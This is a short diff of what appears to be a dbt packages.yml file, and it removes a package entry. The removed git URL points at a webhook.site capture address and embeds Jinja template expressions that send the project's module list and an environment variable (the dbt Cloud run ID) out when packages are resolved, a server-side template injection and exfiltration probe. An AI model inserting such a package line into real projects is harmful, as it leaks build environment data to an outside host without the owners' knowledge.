@@ -1,3 +1,1 @@
-packages:
-  - git: "https://webhook.site/01dd8669-5c8b-4697-a7ea-eb5d2e5b1c72/ssti3/mods={{ modules | list | join(',') | truncate(80) }}/run={{ env_var('DBT_CLOUD_RUN_ID', 'x') }}.git"
-    revision: main
+packages: []
